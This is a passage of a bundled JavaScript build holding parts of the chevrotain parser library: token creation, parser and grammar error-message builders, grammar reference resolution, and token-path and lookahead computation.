  if (has_default(config, PUSH_MODE)) {
    tokenType.PUSH_MODE = config[PUSH_MODE];
  }
  if (has_default(config, LONGER_ALT)) {
    tokenType.LONGER_ALT = config[LONGER_ALT];
  }
  if (has_default(config, LINE_BREAKS)) {
    tokenType.LINE_BREAKS = config[LINE_BREAKS];
  }
  if (has_default(config, START_CHARS_HINT)) {
    tokenType.START_CHARS_HINT = config[START_CHARS_HINT];
  }
  return tokenType;
}
function createTokenInstance(tokType, image, startOffset, endOffset, startLine, endLine, startColumn, endColumn) {
  return {
    image,
    startOffset,
    endOffset,
    startLine,
    endLine,
    startColumn,
    endColumn,
    tokenTypeIdx: tokType.tokenTypeIdx,
    tokenType: tokType
  };
}
function tokenMatcher(token, tokType) {
  return tokenStructuredMatcher(token, tokType);
}
var PARENT, CATEGORIES, LABEL, GROUP, PUSH_MODE, POP_MODE, LONGER_ALT, LINE_BREAKS, START_CHARS_HINT, EOF;
var init_tokens_public = __esm({
  "node_modules/chevrotain/lib/src/scan/tokens_public.js"() {
    init_lodash();
    init_lexer_public();
    init_tokens();
    PARENT = "parent";
    CATEGORIES = "categories";
    LABEL = "label";
    GROUP = "group";
    PUSH_MODE = "push_mode";
    POP_MODE = "pop_mode";
    LONGER_ALT = "longer_alt";
    LINE_BREAKS = "line_breaks";
    START_CHARS_HINT = "start_chars_hint";
    EOF = createToken2({ name: "EOF", pattern: Lexer2.NA });
    augmentTokenTypes([EOF]);
  }
});

// node_modules/chevrotain/lib/src/parse/errors_public.js
var defaultParserErrorProvider, defaultGrammarResolverErrorProvider, defaultGrammarValidatorErrorProvider;
var init_errors_public = __esm({
  "node_modules/chevrotain/lib/src/parse/errors_public.js"() {
    init_tokens_public();
    init_lodash();
    init_api2();
    defaultParserErrorProvider = {
      buildMismatchTokenMessage({ expected, actual, previous, ruleName }) {
        const hasLabel = hasTokenLabel2(expected);
        const expectedMsg = hasLabel ? `--> ${tokenLabel2(expected)} <--` : `token of type --> ${expected.name} <--`;
        const msg = `Expecting ${expectedMsg} but found --> '${actual.image}' <--`;
        return msg;
      },
      buildNotAllInputParsedMessage({ firstRedundant, ruleName }) {
        return "Redundant input, expecting EOF but found: " + firstRedundant.image;
      },
      buildNoViableAltMessage({ expectedPathsPerAlt, actual, previous, customUserDescription, ruleName }) {
        const errPrefix = "Expecting: ";
        const actualText = head_default(actual).image;
        const errSuffix = "\nbut found: '" + actualText + "'";
        if (customUserDescription) {
          return errPrefix + customUserDescription + errSuffix;
        } else {
          const allLookAheadPaths = reduce_default(expectedPathsPerAlt, (result, currAltPaths) => result.concat(currAltPaths), []);
          const nextValidTokenSequences = map_default(allLookAheadPaths, (currPath) => `[${map_default(currPath, (currTokenType) => tokenLabel2(currTokenType)).join(", ")}]`);
          const nextValidSequenceItems = map_default(nextValidTokenSequences, (itemMsg, idx) => `  ${idx + 1}. ${itemMsg}`);
          const calculatedDescription = `one of these possible Token sequences:
${nextValidSequenceItems.join("\n")}`;
          return errPrefix + calculatedDescription + errSuffix;
        }
      },
      buildEarlyExitMessage({ expectedIterationPaths, actual, customUserDescription, ruleName }) {
        const errPrefix = "Expecting: ";
        const actualText = head_default(actual).image;
        const errSuffix = "\nbut found: '" + actualText + "'";
        if (customUserDescription) {
          return errPrefix + customUserDescription + errSuffix;
        } else {
          const nextValidTokenSequences = map_default(expectedIterationPaths, (currPath) => `[${map_default(currPath, (currTokenType) => tokenLabel2(currTokenType)).join(",")}]`);
          const calculatedDescription = `expecting at least one iteration which starts with one of these possible Token sequences::
  <${nextValidTokenSequences.join(" ,")}>`;
          return errPrefix + calculatedDescription + errSuffix;
        }
      }
    };
    Object.freeze(defaultParserErrorProvider);
    defaultGrammarResolverErrorProvider = {
      buildRuleNotFoundError(topLevelRule, undefinedRule) {
        const msg = "Invalid grammar, reference to a rule which is not defined: ->" + undefinedRule.nonTerminalName + "<-\ninside top level rule: ->" + topLevelRule.name + "<-";
        return msg;
      }
    };
    defaultGrammarValidatorErrorProvider = {
      buildDuplicateFoundError(topLevelRule, duplicateProds) {
        function getExtraProductionArgument2(prod) {
          if (prod instanceof Terminal) {
            return prod.terminalType.name;
          } else if (prod instanceof NonTerminal) {
            return prod.nonTerminalName;
          } else {
            return "";
          }
        }
        const topLevelName = topLevelRule.name;
        const duplicateProd = head_default(duplicateProds);
        const index = duplicateProd.idx;
        const dslName = getProductionDslName(duplicateProd);
        const extraArgument = getExtraProductionArgument2(duplicateProd);
        const hasExplicitIndex = index > 0;
        let msg = `->${dslName}${hasExplicitIndex ? index : ""}<- ${extraArgument ? `with argument: ->${extraArgument}<-` : ""}
                  appears more than once (${duplicateProds.length} times) in the top level rule: ->${topLevelName}<-.                  
                  For further details see: https://chevrotain.io/docs/FAQ.html#NUMERICAL_SUFFIXES 
                  `;
        msg = msg.replace(/[ \t]+/g, " ");
        msg = msg.replace(/\s\s+/g, "\n");
        return msg;
      },
      buildNamespaceConflictError(rule) {
        const errMsg = `Namespace conflict found in grammar.
The grammar has both a Terminal(Token) and a Non-Terminal(Rule) named: <${rule.name}>.
To resolve this make sure each Terminal and Non-Terminal names are unique
This is easy to accomplish by using the convention that Terminal names start with an uppercase letter
and Non-Terminal names start with a lower case letter.`;
        return errMsg;
      },
      buildAlternationPrefixAmbiguityError(options) {
        const pathMsg = map_default(options.prefixPath, (currTok) => tokenLabel2(currTok)).join(", ");
        const occurrence = options.alternation.idx === 0 ? "" : options.alternation.idx;
        const errMsg = `Ambiguous alternatives: <${options.ambiguityIndices.join(" ,")}> due to common lookahead prefix
in <OR${occurrence}> inside <${options.topLevelRule.name}> Rule,
<${pathMsg}> may appears as a prefix path in all these alternatives.
See: https://chevrotain.io/docs/guide/resolving_grammar_errors.html#COMMON_PREFIX
For Further details.`;
        return errMsg;
      },
      buildAlternationAmbiguityError(options) {
        const pathMsg = map_default(options.prefixPath, (currtok) => tokenLabel2(currtok)).join(", ");
        const occurrence = options.alternation.idx === 0 ? "" : options.alternation.idx;
        let currMessage = `Ambiguous Alternatives Detected: <${options.ambiguityIndices.join(" ,")}> in <OR${occurrence}> inside <${options.topLevelRule.name}> Rule,
<${pathMsg}> may appears as a prefix path in all these alternatives.
`;
        currMessage = currMessage + `See: https://chevrotain.io/docs/guide/resolving_grammar_errors.html#AMBIGUOUS_ALTERNATIVES
For Further details.`;
        return currMessage;
      },
      buildEmptyRepetitionError(options) {
        let dslName = getProductionDslName(options.repetition);
        if (options.repetition.idx !== 0) {
          dslName += options.repetition.idx;
        }
        const errMsg = `The repetition <${dslName}> within Rule <${options.topLevelRule.name}> can never consume any tokens.
This could lead to an infinite loop.`;
        return errMsg;
      },
      // TODO: remove - `errors_public` from nyc.config.js exclude
      //       once this method is fully removed from this file
      buildTokenNameError(options) {
        return "deprecated";
      },
      buildEmptyAlternationError(options) {
        const errMsg = `Ambiguous empty alternative: <${options.emptyChoiceIdx + 1}> in <OR${options.alternation.idx}> inside <${options.topLevelRule.name}> Rule.
Only the last alternative may be an empty alternative.`;
        return errMsg;
      },
      buildTooManyAlternativesError(options) {
        const errMsg = `An Alternation cannot have more than 256 alternatives:
<OR${options.alternation.idx}> inside <${options.topLevelRule.name}> Rule.
 has ${options.alternation.definition.length + 1} alternatives.`;
        return errMsg;
      },
      buildLeftRecursionError(options) {
        const ruleName = options.topLevelRule.name;
        const pathNames = map_default(options.leftRecursionPath, (currRule) => currRule.name);
        const leftRecursivePath = `${ruleName} --> ${pathNames.concat([ruleName]).join(" --> ")}`;
        const errMsg = `Left Recursion found in grammar.
rule: <${ruleName}> can be invoked from itself (directly or indirectly)
without consuming any Tokens. The grammar path that causes this is: 
 ${leftRecursivePath}
 To fix this refactor your grammar to remove the left recursion.
see: https://en.wikipedia.org/wiki/LL_parser#Left_factoring.`;
        return errMsg;
      },
      // TODO: remove - `errors_public` from nyc.config.js exclude
      //       once this method is fully removed from this file
      buildInvalidRuleNameError(options) {
        return "deprecated";
      },
      buildDuplicateRuleNameError(options) {
        let ruleName;
        if (options.topLevelRule instanceof Rule) {
          ruleName = options.topLevelRule.name;
        } else {
          ruleName = options.topLevelRule;
        }
        const errMsg = `Duplicate definition, rule: ->${ruleName}<- is already defined in the grammar: ->${options.grammarName}<-`;
        return errMsg;
      }
    };
  }
});

// node_modules/chevrotain/lib/src/parse/grammar/resolver.js
function resolveGrammar(topLevels, errMsgProvider) {
  const refResolver = new GastRefResolverVisitor(topLevels, errMsgProvider);
  refResolver.resolveRefs();
  return refResolver.errors;
}
var GastRefResolverVisitor;
var init_resolver = __esm({
  "node_modules/chevrotain/lib/src/parse/grammar/resolver.js"() {
    init_parser();
    init_lodash();
    init_api2();
    GastRefResolverVisitor = class extends GAstVisitor {
      constructor(nameToTopRule, errMsgProvider) {
        super();
        this.nameToTopRule = nameToTopRule;
        this.errMsgProvider = errMsgProvider;
        this.errors = [];
      }
      resolveRefs() {
        forEach_default(values_default(this.nameToTopRule), (prod) => {
          this.currTopLevel = prod;
          prod.accept(this);
        });
      }
      visitNonTerminal(node) {
        const ref = this.nameToTopRule[node.nonTerminalName];
        if (!ref) {
          const msg = this.errMsgProvider.buildRuleNotFoundError(this.currTopLevel, node);
          this.errors.push({
            message: msg,
            type: ParserDefinitionErrorType.UNRESOLVED_SUBRULE_REF,
            ruleName: this.currTopLevel.name,
            unresolvedRefName: node.nonTerminalName
          });
        } else {
          node.referencedRule = ref;
        }
      }
    };
  }
});

// node_modules/chevrotain/lib/src/parse/grammar/interpreter.js
function possiblePathsFrom(targetDef, maxLength, currPath = []) {
  currPath = clone_default(currPath);
  let result = [];
  let i = 0;
  function remainingPathWith(nextDef) {
    return nextDef.concat(drop_default(targetDef, i + 1));
  }
  function getAlternativesForProd(definition) {
    const alternatives = possiblePathsFrom(remainingPathWith(definition), maxLength, currPath);
    return result.concat(alternatives);
  }
  while (currPath.length < maxLength && i < targetDef.length) {
    const prod = targetDef[i];
    if (prod instanceof Alternative) {
      return getAlternativesForProd(prod.definition);
    } else if (prod instanceof NonTerminal) {
      return getAlternativesForProd(prod.definition);
    } else if (prod instanceof Option) {
      result = getAlternativesForProd(prod.definition);
    } else if (prod instanceof RepetitionMandatory) {
      const newDef = prod.definition.concat([
        new Repetition({
          definition: prod.definition
        })
      ]);
      return getAlternativesForProd(newDef);
    } else if (prod instanceof RepetitionMandatoryWithSeparator) {
      const newDef = [
        new Alternative({ definition: prod.definition }),
        new Repetition({
          definition: [new Terminal({ terminalType: prod.separator })].concat(prod.definition)
        })
      ];
      return getAlternativesForProd(newDef);
    } else if (prod instanceof RepetitionWithSeparator) {
      const newDef = prod.definition.concat([
        new Repetition({
          definition: [new Terminal({ terminalType: prod.separator })].concat(prod.definition)
        })
      ]);
      result = getAlternativesForProd(newDef);
    } else if (prod instanceof Repetition) {
      const newDef = prod.definition.concat([
        new Repetition({
          definition: prod.definition
        })
      ]);
      result = getAlternativesForProd(newDef);
    } else if (prod instanceof Alternation) {
      forEach_default(prod.definition, (currAlt) => {
        if (isEmpty_default(currAlt.definition) === false) {
          result = getAlternativesForProd(currAlt.definition);
        }
      });
      return result;
    } else if (prod instanceof Terminal) {
      currPath.push(prod.terminalType);
    } else {
      throw Error("non exhaustive match");
    }
    i++;
  }
  result.push({
    partialPath: currPath,
    suffixDef: drop_default(targetDef, i)
  });
  return result;
}
function nextPossibleTokensAfter(initialDef, tokenVector, tokMatcher, maxLookAhead) {
  const EXIT_NON_TERMINAL = "EXIT_NONE_TERMINAL";
  const EXIT_NON_TERMINAL_ARR = [EXIT_NON_TERMINAL];
  const EXIT_ALTERNATIVE = "EXIT_ALTERNATIVE";
  let foundCompletePath = false;
  const tokenVectorLength = tokenVector.length;
  const minimalAlternativesIndex = tokenVectorLength - maxLookAhead - 1;
  const result = [];
  const possiblePaths = [];
  possiblePaths.push({
    idx: -1,
    def: initialDef,
    ruleStack: [],
    occurrenceStack: []
  });
  while (!isEmpty_default(possiblePaths)) {
    const currPath = possiblePaths.pop();
    if (currPath === EXIT_ALTERNATIVE) {
      if (foundCompletePath && last_default(possiblePaths).idx <= minimalAlternativesIndex) {
        possiblePaths.pop();
      }
      continue;
    }
    const currDef = currPath.def;
    const currIdx = currPath.idx;
    const currRuleStack = currPath.ruleStack;
    const currOccurrenceStack = currPath.occurrenceStack;
    if (isEmpty_default(currDef)) {
      continue;
    }
    const prod = currDef[0];
    if (prod === EXIT_NON_TERMINAL) {
      const nextPath = {
        idx: currIdx,
        def: drop_default(currDef),
        ruleStack: dropRight_default(currRuleStack),
        occurrenceStack: dropRight_default(currOccurrenceStack)
      };
      possiblePaths.push(nextPath);
    } else if (prod instanceof Terminal) {
      if (currIdx < tokenVectorLength - 1) {
        const nextIdx = currIdx + 1;
        const actualToken = tokenVector[nextIdx];
        if (tokMatcher(actualToken, prod.terminalType)) {
          const nextPath = {
            idx: nextIdx,
            def: drop_default(currDef),
            ruleStack: currRuleStack,
            occurrenceStack: currOccurrenceStack
          };
          possiblePaths.push(nextPath);
        }
      } else if (currIdx === tokenVectorLength - 1) {
        result.push({
          nextTokenType: prod.terminalType,
          nextTokenOccurrence: prod.idx,
          ruleStack: currRuleStack,
          occurrenceStack: currOccurrenceStack
        });
        foundCompletePath = true;
      } else {
        throw Error("non exhaustive match");
      }
    } else if (prod instanceof NonTerminal) {
      const newRuleStack = clone_default(currRuleStack);
      newRuleStack.push(prod.nonTerminalName);
      const newOccurrenceStack = clone_default(currOccurrenceStack);
      newOccurrenceStack.push(prod.idx);
      const nextPath = {
        idx: currIdx,
        def: prod.definition.concat(EXIT_NON_TERMINAL_ARR, drop_default(currDef)),
        ruleStack: newRuleStack,
        occurrenceStack: newOccurrenceStack
      };
      possiblePaths.push(nextPath);
    } else if (prod instanceof Option) {
      const nextPathWithout = {
        idx: currIdx,
        def: drop_default(currDef),
        ruleStack: currRuleStack,
        occurrenceStack: currOccurrenceStack
      };
      possiblePaths.push(nextPathWithout);
      possiblePaths.push(EXIT_ALTERNATIVE);
      const nextPathWith = {
        idx: currIdx,
        def: prod.definition.concat(drop_default(currDef)),
        ruleStack: currRuleStack,
        occurrenceStack: currOccurrenceStack
      };
      possiblePaths.push(nextPathWith);
    } else if (prod instanceof RepetitionMandatory) {
      const secondIteration = new Repetition({
        definition: prod.definition,
        idx: prod.idx
      });
      const nextDef = prod.definition.concat([secondIteration], drop_default(currDef));
      const nextPath = {
        idx: currIdx,
        def: nextDef,
        ruleStack: currRuleStack,
        occurrenceStack: currOccurrenceStack
      };
      possiblePaths.push(nextPath);
    } else if (prod instanceof RepetitionMandatoryWithSeparator) {
      const separatorGast = new Terminal({
        terminalType: prod.separator
      });
      const secondIteration = new Repetition({
        definition: [separatorGast].concat(prod.definition),
        idx: prod.idx
      });
      const nextDef = prod.definition.concat([secondIteration], drop_default(currDef));
      const nextPath = {
        idx: currIdx,
        def: nextDef,
        ruleStack: currRuleStack,
        occurrenceStack: currOccurrenceStack
      };
      possiblePaths.push(nextPath);
    } else if (prod instanceof RepetitionWithSeparator) {
      const nextPathWithout = {
        idx: currIdx,
        def: drop_default(currDef),
        ruleStack: currRuleStack,
        occurrenceStack: currOccurrenceStack
      };
      possiblePaths.push(nextPathWithout);
      possiblePaths.push(EXIT_ALTERNATIVE);
      const separatorGast = new Terminal({
        terminalType: prod.separator
      });
      const nthRepetition = new Repetition({
        definition: [separatorGast].concat(prod.definition),
        idx: prod.idx
      });
      const nextDef = prod.definition.concat([nthRepetition], drop_default(currDef));
      const nextPathWith = {
        idx: currIdx,
        def: nextDef,
        ruleStack: currRuleStack,
        occurrenceStack: currOccurrenceStack
      };
      possiblePaths.push(nextPathWith);
    } else if (prod instanceof Repetition) {
      const nextPathWithout = {
        idx: currIdx,
        def: drop_default(currDef),
        ruleStack: currRuleStack,
        occurrenceStack: currOccurrenceStack
      };
      possiblePaths.push(nextPathWithout);
      possiblePaths.push(EXIT_ALTERNATIVE);
      const nthRepetition = new Repetition({
        definition: prod.definition,
        idx: prod.idx
      });
      const nextDef = prod.definition.concat([nthRepetition], drop_default(currDef));
      const nextPathWith = {
        idx: currIdx,
        def: nextDef,
        ruleStack: currRuleStack,
        occurrenceStack: currOccurrenceStack
      };
      possiblePaths.push(nextPathWith);
    } else if (prod instanceof Alternation) {
      for (let i = prod.definition.length - 1; i >= 0; i--) {
        const currAlt = prod.definition[i];
        const currAltPath = {
          idx: currIdx,
          def: currAlt.definition.concat(drop_default(currDef)),
          ruleStack: currRuleStack,
          occurrenceStack: currOccurrenceStack
        };
        possiblePaths.push(currAltPath);
        possiblePaths.push(EXIT_ALTERNATIVE);
      }
    } else if (prod instanceof Alternative) {
      possiblePaths.push({
        idx: currIdx,
        def: prod.definition.concat(drop_default(currDef)),
        ruleStack: currRuleStack,
        occurrenceStack: currOccurrenceStack
      });
    } else if (prod instanceof Rule) {
      possiblePaths.push(expandTopLevelRule(prod, currIdx, currRuleStack, currOccurrenceStack));
    } else {
      throw Error("non exhaustive match");
    }
  }
  return result;
}
function expandTopLevelRule(topRule, currIdx, currRuleStack, currOccurrenceStack) {
  const newRuleStack = clone_default(currRuleStack);
  newRuleStack.push(topRule.name);
  const newCurrOccurrenceStack = clone_default(currOccurrenceStack);
  newCurrOccurrenceStack.push(1);
  return {
    idx: currIdx,
    def: topRule.definition,
    ruleStack: newRuleStack,
    occurrenceStack: newCurrOccurrenceStack
  };
}
var AbstractNextPossibleTokensWalker, NextAfterTokenWalker, AbstractNextTerminalAfterProductionWalker, NextTerminalAfterManyWalker, NextTerminalAfterManySepWalker, NextTerminalAfterAtLeastOneWalker, NextTerminalAfterAtLeastOneSepWalker;
var init_interpreter = __esm({
  "node_modules/chevrotain/lib/src/parse/grammar/interpreter.js"() {
    init_lodash();
    init_first2();
    init_rest();
    init_api2();
    AbstractNextPossibleTokensWalker = class extends RestWalker {
      constructor(topProd, path2) {
        super();
        this.topProd = topProd;
        this.path = path2;
        this.possibleTokTypes = [];
        this.nextProductionName = "";
        this.nextProductionOccurrence = 0;
        this.found = false;
        this.isAtEndOfPath = false;
      }
      startWalking() {
        this.found = false;
        if (this.path.ruleStack[0] !== this.topProd.name) {
          throw Error("The path does not start with the walker's top Rule!");
        }
        this.ruleStack = clone_default(this.path.ruleStack).reverse();
        this.occurrenceStack = clone_default(this.path.occurrenceStack).reverse();
        this.ruleStack.pop();
        this.occurrenceStack.pop();
        this.updateExpectedNext();
        this.walk(this.topProd);
        return this.possibleTokTypes;
      }
      walk(prod, prevRest = []) {
        if (!this.found) {
          super.walk(prod, prevRest);
        }
      }
      walkProdRef(refProd, currRest, prevRest) {
        if (refProd.referencedRule.name === this.nextProductionName && refProd.idx === this.nextProductionOccurrence) {
          const fullRest = currRest.concat(prevRest);
          this.updateExpectedNext();
          this.walk(refProd.referencedRule, fullRest);
        }
      }
      updateExpectedNext() {
        if (isEmpty_default(this.ruleStack)) {
          this.nextProductionName = "";
          this.nextProductionOccurrence = 0;
          this.isAtEndOfPath = true;
        } else {
          this.nextProductionName = this.ruleStack.pop();
          this.nextProductionOccurrence = this.occurrenceStack.pop();
        }
      }
    };
    NextAfterTokenWalker = class extends AbstractNextPossibleTokensWalker {
      constructor(topProd, path2) {
        super(topProd, path2);
        this.path = path2;
        this.nextTerminalName = "";
        this.nextTerminalOccurrence = 0;
        this.nextTerminalName = this.path.lastTok.name;
        this.nextTerminalOccurrence = this.path.lastTokOccurrence;
      }
      walkTerminal(terminal, currRest, prevRest) {
        if (this.isAtEndOfPath && terminal.terminalType.name === this.nextTerminalName && terminal.idx === this.nextTerminalOccurrence && !this.found) {
          const fullRest = currRest.concat(prevRest);
          const restProd = new Alternative({ definition: fullRest });
          this.possibleTokTypes = first(restProd);
          this.found = true;
        }
      }
    };
    AbstractNextTerminalAfterProductionWalker = class extends RestWalker {
      constructor(topRule, occurrence) {
        super();
        this.topRule = topRule;
        this.occurrence = occurrence;
        this.result = {
          token: void 0,
          occurrence: void 0,
          isEndOfRule: void 0
        };
      }
      startWalking() {
        this.walk(this.topRule);
        return this.result;
      }
    };
    NextTerminalAfterManyWalker = class extends AbstractNextTerminalAfterProductionWalker {
      walkMany(manyProd, currRest, prevRest) {
        if (manyProd.idx === this.occurrence) {
          const firstAfterMany = head_default(currRest.concat(prevRest));
          this.result.isEndOfRule = firstAfterMany === void 0;
          if (firstAfterMany instanceof Terminal) {
            this.result.token = firstAfterMany.terminalType;
            this.result.occurrence = firstAfterMany.idx;
          }
        } else {
          super.walkMany(manyProd, currRest, prevRest);
        }
      }
    };
    NextTerminalAfterManySepWalker = class extends AbstractNextTerminalAfterProductionWalker {
      walkManySep(manySepProd, currRest, prevRest) {
        if (manySepProd.idx === this.occurrence) {
          const firstAfterManySep = head_default(currRest.concat(prevRest));
          this.result.isEndOfRule = firstAfterManySep === void 0;
          if (firstAfterManySep instanceof Terminal) {
            this.result.token = firstAfterManySep.terminalType;
            this.result.occurrence = firstAfterManySep.idx;
          }
        } else {
          super.walkManySep(manySepProd, currRest, prevRest);
        }
      }
    };
    NextTerminalAfterAtLeastOneWalker = class extends AbstractNextTerminalAfterProductionWalker {
      walkAtLeastOne(atLeastOneProd, currRest, prevRest) {
        if (atLeastOneProd.idx === this.occurrence) {
          const firstAfterAtLeastOne = head_default(currRest.concat(prevRest));
          this.result.isEndOfRule = firstAfterAtLeastOne === void 0;
          if (firstAfterAtLeastOne instanceof Terminal) {
            this.result.token = firstAfterAtLeastOne.terminalType;
            this.result.occurrence = firstAfterAtLeastOne.idx;
          }
        } else {
          super.walkAtLeastOne(atLeastOneProd, currRest, prevRest);
        }
      }
    };
    NextTerminalAfterAtLeastOneSepWalker = class extends AbstractNextTerminalAfterProductionWalker {
      walkAtLeastOneSep(atleastOneSepProd, currRest, prevRest) {
        if (atleastOneSepProd.idx === this.occurrence) {
          const firstAfterfirstAfterAtLeastOneSep = head_default(currRest.concat(prevRest));
          this.result.isEndOfRule = firstAfterfirstAfterAtLeastOneSep === void 0;
          if (firstAfterfirstAfterAtLeastOneSep instanceof Terminal) {
            this.result.token = firstAfterfirstAfterAtLeastOneSep.terminalType;
            this.result.occurrence = firstAfterfirstAfterAtLeastOneSep.idx;
          }
        } else {
          super.walkAtLeastOneSep(atleastOneSepProd, currRest, prevRest);
        }
      }
    };
  }
});

// node_modules/chevrotain/lib/src/parse/grammar/lookahead.js
function getProdType(prod) {
  if (prod instanceof Option || prod === "Option") {
    return PROD_TYPE.OPTION;
  } else if (prod instanceof Repetition || prod === "Repetition") {
    return PROD_TYPE.REPETITION;
  } else if (prod instanceof RepetitionMandatory || prod === "RepetitionMandatory") {
    return PROD_TYPE.REPETITION_MANDATORY;
  } else if (prod instanceof RepetitionMandatoryWithSeparator || prod === "RepetitionMandatoryWithSeparator") {
    return PROD_TYPE.REPETITION_MANDATORY_WITH_SEPARATOR;
  } else if (prod instanceof RepetitionWithSeparator || prod === "RepetitionWithSeparator") {
    return PROD_TYPE.REPETITION_WITH_SEPARATOR;
  } else if (prod instanceof Alternation || prod === "Alternation") {
    return PROD_TYPE.ALTERNATION;
  } else {
    throw Error("non exhaustive match");
  }
}
function getLookaheadPaths(options) {
  const { occurrence, rule, prodType, maxLookahead } = options;
  const type = getProdType(prodType);
  if (type === PROD_TYPE.ALTERNATION) {
    return getLookaheadPathsForOr(occurrence, rule, maxLookahead);
  } else {
    return getLookaheadPathsForOptionalProd(occurrence, rule, type, maxLookahead);
  }
}
function buildLookaheadFuncForOr(occurrence, ruleGrammar, maxLookahead, hasPredicates, dynamicTokensEnabled, laFuncBuilder) {
  const lookAheadPaths = getLookaheadPathsForOr(occurrence, ruleGrammar, maxLookahead);
  const tokenMatcher2 = areTokenCategoriesNotUsed(lookAheadPaths) ? tokenStructuredMatcherNoCategories : tokenStructuredMatcher;
  return laFuncBuilder(lookAheadPaths, hasPredicates, tokenMatcher2, dynamicTokensEnabled);
}
function buildLookaheadFuncForOptionalProd(occurrence, ruleGrammar, k, dynamicTokensEnabled, prodType, lookaheadBuilder) {
  const lookAheadPaths = getLookaheadPathsForOptionalProd(occurrence, ruleGrammar, prodType, k);
  const tokenMatcher2 = areTokenCategoriesNotUsed(lookAheadPaths) ? tokenStructuredMatcherNoCategories : tokenStructuredMatcher;
  return lookaheadBuilder(lookAheadPaths[0], tokenMatcher2, dynamicTokensEnabled);
}
function buildAlternativesLookAheadFunc(alts, hasPredicates, tokenMatcher2, dynamicTokensEnabled) {
  const numOfAlts = alts.length;
  const areAllOneTokenLookahead = every_default(alts, (currAlt) => {
    return every_default(currAlt, (currPath) => {
      return currPath.length === 1;
    });
  });
  if (hasPredicates) {
    return function(orAlts) {
      const predicates = map_default(orAlts, (currAlt) => currAlt.GATE);
      for (let t = 0; t < numOfAlts; t++) {
        const currAlt = alts[t];
        const currNumOfPaths = currAlt.length;
        const currPredicate = predicates[t];
        if (currPredicate !== void 0 && currPredicate.call(this) === false) {
          continue;
        }
        nextPath: for (let j = 0; j < currNumOfPaths; j++) {
          const currPath = currAlt[j];
          const currPathLength = currPath.length;
          for (let i = 0; i < currPathLength; i++) {
            const nextToken = this.LA(i + 1);
            if (tokenMatcher2(nextToken, currPath[i]) === false) {
              continue nextPath;
            }
          }
          return t;
        }
      }
      return void 0;
    };
  } else if (areAllOneTokenLookahead && !dynamicTokensEnabled) {
    const singleTokenAlts = map_default(alts, (currAlt) => {
      return flatten_default(currAlt);
    });
    const choiceToAlt = reduce_default(singleTokenAlts, (result, currAlt, idx) => {
      forEach_default(currAlt, (currTokType) => {
        if (!has_default(result, currTokType.tokenTypeIdx)) {
          result[currTokType.tokenTypeIdx] = idx;
        }
        forEach_default(currTokType.categoryMatches, (currExtendingType) => {
          if (!has_default(result, currExtendingType)) {
            result[currExtendingType] = idx;
          }
        });
      });
      return result;
    }, {});
    return function() {
      const nextToken = this.LA(1);
      return choiceToAlt[nextToken.tokenTypeIdx];
    };
  } else {
    return function() {
      for (let t = 0; t < numOfAlts; t++) {
        const currAlt = alts[t];
        const currNumOfPaths = currAlt.length;
        nextPath: for (let j = 0; j < currNumOfPaths; j++) {
          const currPath = currAlt[j];
          const currPathLength = currPath.length;
          for (let i = 0; i < currPathLength; i++) {
            const nextToken = this.LA(i + 1);
            if (tokenMatcher2(nextToken, currPath[i]) === false) {
              continue nextPath;
            }
          }
          return t;
        }
      }
      return void 0;
    };
  }
}
function buildSingleAlternativeLookaheadFunction(alt, tokenMatcher2, dynamicTokensEnabled) {
  const areAllOneTokenLookahead = every_default(alt, (currPath) => {
    return currPath.length === 1;
  });
  const numOfPaths = alt.length;
  if (areAllOneTokenLookahead && !dynamicTokensEnabled) {
    const singleTokensTypes = flatten_default(alt);
    if (singleTokensTypes.length === 1 && isEmpty_default(singleTokensTypes[0].categoryMatches)) {
      const expectedTokenType = singleTokensTypes[0];
      const expectedTokenUniqueKey = expectedTokenType.tokenTypeIdx;
      return function() {
        return this.LA(1).tokenTypeIdx === expectedTokenUniqueKey;
      };
    } else {
      const choiceToAlt = reduce_default(singleTokensTypes, (result, currTokType, idx) => {
        result[currTokType.tokenTypeIdx] = true;
        forEach_default(currTokType.categoryMatches, (currExtendingType) => {
          result[currExtendingType] = true;
        });
        return result;
      }, []);
      return function() {
        const nextToken = this.LA(1);
        return choiceToAlt[nextToken.tokenTypeIdx] === true;
      };
    }
  } else {
    return function() {
      nextPath: for (let j = 0; j < numOfPaths; j++) {
        const currPath = alt[j];
        const currPathLength = currPath.length;
        for (let i = 0; i < currPathLength; i++) {
          const nextToken = this.LA(i + 1);
          if (tokenMatcher2(nextToken, currPath[i]) === false) {
            continue nextPath;
          }
        }
        return true;
      }
      return false;
    };
  }
}
function initializeArrayOfArrays(size) {
  const result = new Array(size);
  for (let i = 0; i < size; i++) {
    result[i] = [];
  }
  return result;
}
function pathToHashKeys(path2) {
  let keys2 = [""];
  for (let i = 0; i < path2.length; i++) {
    const tokType = path2[i];
    const longerKeys = [];
    for (let j = 0; j < keys2.length; j++) {
      const currShorterKey = keys2[j];
      longerKeys.push(currShorterKey + "_" + tokType.tokenTypeIdx);
      for (let t = 0; t < tokType.categoryMatches.length; t++) {
        const categoriesKeySuffix = "_" + tokType.categoryMatches[t];
        longerKeys.push(currShorterKey + categoriesKeySuffix);
      }
    }
    keys2 = longerKeys;
  }
  return keys2;
}
function isUniquePrefixHash(altKnownPathsKeys, searchPathKeys, idx) {
  for (let currAltIdx = 0; currAltIdx < altKnownPathsKeys.length; currAltIdx++) {
    if (currAltIdx === idx) {
      continue;
    }
    const otherAltKnownPathsKeys = altKnownPathsKeys[currAltIdx];
    for (let searchIdx = 0; searchIdx < searchPathKeys.length; searchIdx++) {
      const searchKey = searchPathKeys[searchIdx];
      if (otherAltKnownPathsKeys[searchKey] === true) {
        return false;
      }
    }
  }
  return true;
}
function lookAheadSequenceFromAlternatives(altsDefs, k) {
  const partialAlts = map_default(altsDefs, (currAlt) => possiblePathsFrom([currAlt], 1));
  const finalResult = initializeArrayOfArrays(partialAlts.length);
  const altsHashes = map_default(partialAlts, (currAltPaths) => {
    const dict = {};
    forEach_default(currAltPaths, (item) => {
      const keys2 = pathToHashKeys(item.partialPath);
      forEach_default(keys2, (currKey) => {
        dict[currKey] = true;
      });
    });
    return dict;
  });
  let newData = partialAlts;
  for (let pathLength = 1; pathLength <= k; pathLength++) {
    const currDataset = newData;
    newData = initializeArrayOfArrays(currDataset.length);
    for (let altIdx = 0; altIdx < currDataset.length; altIdx++) {
      const currAltPathsAndSuffixes = currDataset[altIdx];
      for (let currPathIdx = 0; currPathIdx < currAltPathsAndSuffixes.length; currPathIdx++) {
        const currPathPrefix = currAltPathsAndSuffixes[currPathIdx].partialPath;
        const suffixDef = currAltPathsAndSuffixes[currPathIdx].suffixDef;
        const prefixKeys = pathToHashKeys(currPathPrefix);
